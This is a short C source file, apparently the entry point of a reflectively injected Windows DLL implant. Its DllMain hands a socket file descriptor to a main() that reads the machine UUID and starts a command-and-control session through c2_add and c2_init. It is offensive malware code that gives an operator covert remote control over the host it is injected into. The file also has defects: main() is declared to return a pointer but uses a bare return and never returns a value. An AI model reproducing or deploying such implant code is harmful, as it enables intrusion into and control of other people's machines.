#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "ReflectiveLoader.c"

#include <stdio.h>
#include <stdint.h>
#include <windows.h>

LPVOID main(LPVOID lpReserved) {
	c2_t *c2;

    int fd;
    char uuid[UUID_SIZE];

    c2 = NULL;
    fd = (int)((long *)lpReserved)[1];

    if (machine_uuid(uuid) < 0)
    {
        return;
    }

    c2_add(&c2, 0, fd, uuid);

    c2_init(c2);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		main(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
